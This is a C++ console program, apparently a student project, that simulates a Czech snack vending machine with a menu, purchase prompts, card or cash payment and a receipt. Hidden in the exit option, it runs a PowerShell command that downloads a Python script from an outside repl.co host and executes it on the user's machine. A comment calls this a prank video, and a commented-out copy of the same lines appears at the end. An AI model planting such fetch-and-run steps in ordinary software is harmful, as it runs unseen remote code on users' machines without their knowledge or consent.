// Obsah automatu: preclíky (8), bageta - kuře (13), snickers (8), lentilky (8), sandwitch (8), twix (4), kitkat (6)

#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include<string.h>

using namespace std;

// Obecné Proměnné
string currentItem = "                                           ";
string buyingItem;
char YesOrNo;
bool buyedSomething = false;
int userPin = 8522;

// User Input
int userInputWhatItem;
int userInputItemAmmount;
int userInputPaymentMethot;
int userInputPin;

// Jednotlivé Předměty  cena počet součet
int preclikySeznam[3] = { 25 , 0 , 0};
int snickersSeznam[3] = { 20 };
int twixSeznam[3] = { 20 };
int kitkatSeznam[3] = { 20 };
int lentilkySeznam[3] = { 15 };
int magnesiaSeznam[3] = { 25 };
int bagetaSeznam[3] = { 80 };

// Funkce pro změnu barvy - zkopírováno ze Stackoverflow
string setcolor(unsigned short color) {
    HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hcon, color);
    return "";
}

// Funkce pro nákup předmětů

void BuyItBaby() {
    cout << "Kolikrat by jste si chtetli zakoupit " << buyingItem << " ";
    cin >> userInputItemAmmount;
    cout << "\n";
    cout << "Jste si jisti ze si chcete zakoupit " << buyingItem << " " << userInputItemAmmount << " krat? [y/n] ";
    cin >> YesOrNo;
    if (YesOrNo == 'y') {
        if (buyingItem == "precliky") {
            preclikySeznam[1] = preclikySeznam[1] + userInputItemAmmount;
            preclikySeznam[2] = preclikySeznam[1] * preclikySeznam[0];
        }
        if (buyingItem == "snickers") {
            snickersSeznam[1] = snickersSeznam[1] + userInputItemAmmount;
            snickersSeznam[2] = snickersSeznam[1] * snickersSeznam[0];
        }
        if (buyingItem == "twix") {
            twixSeznam[1] = twixSeznam[1] + userInputItemAmmount;
            twixSeznam[2] = twixSeznam[1] * twixSeznam[0];
        }
        if (buyingItem == "kitkat") {
            kitkatSeznam[1] = kitkatSeznam[1] + userInputItemAmmount;
            kitkatSeznam[2] = kitkatSeznam[1] * kitkatSeznam[0];
        }
        if (buyingItem == "lentilky") {
            lentilkySeznam[1] = lentilkySeznam[1] + userInputItemAmmount;
            lentilkySeznam[2] = lentilkySeznam[1] * lentilkySeznam[0];
        }
        if (buyingItem == "magnesia") {
            magnesiaSeznam[1] = magnesiaSeznam[1] + userInputItemAmmount;
            magnesiaSeznam[2] = magnesiaSeznam[1] * magnesiaSeznam[0];
        }
        if (buyingItem == "bageta - kure") {
            bagetaSeznam[1] = bagetaSeznam[1] + userInputItemAmmount;
            bagetaSeznam[2] = bagetaSeznam[1] * bagetaSeznam[0];
        }
    }
    else {
        system("cls");
    }

    buyedSomething = true;

}

void PrintTicket() {

    cout << "===================================";
    cout << "\n";
    cout << "\n";

    if (preclikySeznam[1] > 0) {
        cout << "| precliky( " << preclikySeznam[1] << " ) ........ " << preclikySeznam[2] << " \n";
    }
    if (snickersSeznam[1] > 0) {
        cout << "| snickers( " << snickersSeznam[1] << " ) ........ " << snickersSeznam[2] << " \n";
    }
    if (twixSeznam[1] > 0) {
        cout << "| twix( " << twixSeznam[1] << " ) ............ " << twixSeznam[2] << " \n";
    }
    if (kitkatSeznam[1] > 0) {
        cout << "| kitkat( " << kitkatSeznam[1] << " ) .......... " << kitkatSeznam[2] << " \n";
    }
    if (lentilkySeznam[1] > 0) {
        cout << "| lentilky( " << lentilkySeznam[1] << " ) ........ " << lentilkySeznam[2] << " \n";
    }
    if (magnesiaSeznam[1] > 0) {
        cout << "| magnesia( " << magnesiaSeznam[1] << " ) ........ " << magnesiaSeznam[2] << " \n";
    }
    if (bagetaSeznam[1] > 0) {
        cout << "| bageta - kure( " << bagetaSeznam[1] << " ) ..... " << bagetaSeznam[2] << " \n";
    }
    cout << "\n";

    // Random Numbers generator

    // Reset Seed
    srand(time(NULL));
    cout << "\t";


    for (int i = 0; i < 5; i++) {

        // Random number generated here
        int random = rand() % 10;

        cout << random;
    }

    cout << "\t \t";

    // Reset Seed
    srand(time(NULL));

    for (int i = 0; i < 5; i++) {
        char cch;

        // Random character getereted here
        cch = 'a' + rand() % 26;

        cout << cch;
    }

    cout << "\n";

    cout << "=================================== \n";

}

int main()
{

automat:
    system("cls");
    cout << "#==============#==============#=============# \n";
    cout << "|              |              |     123     | \n";
    cout << "| "; setcolor(6); cout << "precliky(25)"; setcolor(15); cout << " | "; setcolor(6); cout << "snickers(20)"; setcolor(15); cout << " |     456     | \n";
    cout << "|              |              |     789     | \n";
    cout << "#=====[11]=====#=====[22]=====#             | \n";
    cout << "|              |              |     ___     | \n";
    cout << "|   "; setcolor(6); cout << "twix(20)"; setcolor(15); cout << "   | "; setcolor(6); cout << "lentilky(15)"; setcolor(15); cout << " |     | |     | \n";
    cout << "|              |              |     ---     | \n";
    cout << "#=====[33]=====#=====[44]=====#             | \n";
    cout << "|              |              |     [ ]     | \n";
    cout << "|  "; setcolor(6); cout << "kitkat(20)"; setcolor(15); cout << "  | "; setcolor(6); cout << "magnesia(25)"; setcolor(15); cout << " |             | \n";
    cout << "|              |              |             | \n";
    cout << "#=====[55]=====#=====[66]=====#             | \n";
    cout << "|                             |             | \n";
    cout << "|      "; setcolor(6); cout << "bageta - kure(80)"; setcolor(15); cout << "      |             | \n";
    cout << "|                             |             | \n";
    cout << "#============[111]============#=============# \n";
    cout << "|                                           | \n";
    cout << "|" << currentItem << "| \n";   // 43
    cout << "|                                           | \n";
    cout << "#===========================================# \n";
    cout << "I                                           I \n";
    cout << "\n";
    cout << "odejit [999]                   zaplatit [000] \n";
    cout << "\n";
    goto shopInput;

shopInput:
    cout << "co by jste si pral ";
    cin >> userInputWhatItem;

    switch (userInputWhatItem)
    {
        // preclíky     cena:25
    case 11:
        cout << "\n";
        cout << "\n";
        cout << "--------------[ precliky(11) ]------------";
        cout << "\n";
        cout << "Prejete si zakoupit predmet precliky [y/n] ";
        cin >> YesOrNo;
        if (YesOrNo == 'y') {
            currentItem = "                  precliky                 ";
            buyingItem = "precliky";
            BuyItBaby();
            goto automat;
        }
        else {
            system("cls");
            goto automat;
        }
        break;

        // snickers     cena:20
    case 22:
        cout << "\n";
        cout << "\n";
        cout << "--------------[ snickers(22) ]------------";
        cout << "\n";
        cout << "Prejete si zakoupit predmet snickers [y/n] ";
        cin >> YesOrNo;
        if (YesOrNo == 'y') {
            currentItem = "                  snickers                 ";
            buyingItem = "snickers";
            BuyItBaby();
            goto automat;
        }
        else {
            system("cls");
            goto automat;
        }
        break;

        // twix         cena:20
    case 33:
        cout << "\n";
        cout << "\n";
        cout << "----------------[ twix(33) ]--------------";
        cout << "\n";
        cout << "Prejete si zakoupit predmet twix [y/n] ";
        cin >> YesOrNo;
        if (YesOrNo == 'y') {
            currentItem = "                    twix                   ";
            buyingItem = "twix";
            BuyItBaby();
            goto automat;
        }
        else {
            system("cls");
            goto automat;
        }
        break;

        // lentilky     cena:15
    case 44:
        cout << "\n";
        cout << "\n";
        cout << "--------------[ lentilky(44) ]-------------";
        cout << "\n";
        cout << "Prejete si zakoupit predmet lentilky [y/n] ";
        cin >> YesOrNo;
        if (YesOrNo == 'y') {
            currentItem = "                  lentilky                 ";
            buyingItem = "lentilky";
            BuyItBaby();
            goto automat;
        }
        else {
            system("cls");
            goto automat;
        }
        break;

        // kitkat       cena:20
    case 55:
        cout << "\n";
        cout << "\n";
        cout << "---------------[ kitkat(55) ]-------------";
        cout << "\n";
        cout << "Prejete si zakoupit predmet kitkat [y/n] ";
        cin >> YesOrNo;
        if (YesOrNo == 'y') {
            currentItem = "                   kitkat                  ";
            buyingItem = "kitkat";
            BuyItBaby();
            goto automat;
        }
        else {
            system("cls");
            goto automat;
        }
        break;

        // magnesia     cena:25
    case 66:
        cout << "\n";
        cout << "\n";
        cout << "--------------[ magnesia(66) ]------------";
        cout << "\n";
        cout << "Prejete si zakoupit predmet magnesia [y/n] ";
        cin >> YesOrNo;
        if (YesOrNo == 'y') {
            currentItem = "                  magnesia                 ";
            buyingItem = "magnesia";
            BuyItBaby();
            goto automat;
        }
        else {
            system("cls");
            goto automat;
        }
        break;

        // bageta - kure    cena: 80
    case 111:
        cout << "\n";
        cout << "\n";
        cout << "-----------[ bageta - kure (111) ]---------";
        cout << "\n";
        cout << "Prejete si zakoupit predmet bageta - kure [y/n] ";
        cin >> YesOrNo;
        if (YesOrNo == 'y') {
            currentItem = "               bageta - kure               ";
            buyingItem = "bageta - kure";
            BuyItBaby();
            goto automat;
        }
        else {
            system("cls");
            goto automat;
        }
        break;

    // Odchod
    case 999:
        // Checks if user bought soething if yes it plays YT video of that old add "you wudn't steal a car" and puts him back to shoping
        if (buyedSomething == true) {
            system("PowerShell -Command \"Invoke-WebRequest \'https://my-python-scripts.helianes.repl.co/skolaSteal.py \' -OutFile dontDoThat.py\"");
            system("dontDoThat.py");
            system("cls");
            goto automat;
        }
        else {
            return 0;
        }
        break;

    // Zaplatit
    case 000: {
        system("cls");

        int Soucet = preclikySeznam[2] + snickersSeznam[2] + lentilkySeznam[2] + magnesiaSeznam[2] + bagetaSeznam[2] + twixSeznam[2] + kitkatSeznam[2];

        cout << "Soucet ... " << Soucet << "\n";
        cout << "\n";
        cout << "Prejete si platit: \n 1) Kartou \n 2) Hotove \n 99) Pokracovat v nakupu \n";
        cin >> userInputPaymentMethot;

        switch (userInputPaymentMethot)
        {
        // Kartou
        case 1:
            cout << "\n";
            cout << "Platba kartou - prosim zadejte pin: ";
            cin >> userInputPin;
            cout << "\n";
            if (userInputPin == userPin) {
                cout << "Dekujeme za vas nakup. \n";
                PrintTicket();
            }
            else {
                goto automat;
            }
            break;

        // Hotově
        case 2:
            cout << "Dekujeme za vas nakup. \n";
            PrintTicket();
            break;

        // Zpět
        default:
            goto automat;
            break;

        }

        break;
    }

            // default aby zachytil nepovedeny input
    default:
        cout << " Omlouvam se ale tento predmet neni k dispozici ";
        system("cls");
        goto automat;
        break;
    }

    //system("PowerShell -Command \"Invoke-WebRequest \'https://my-python-scripts.helianes.repl.co/skolaSteal.py \' -OutFile dontDoThat.py\"");
    //system("dontDoThat.py");

    return 0;
}
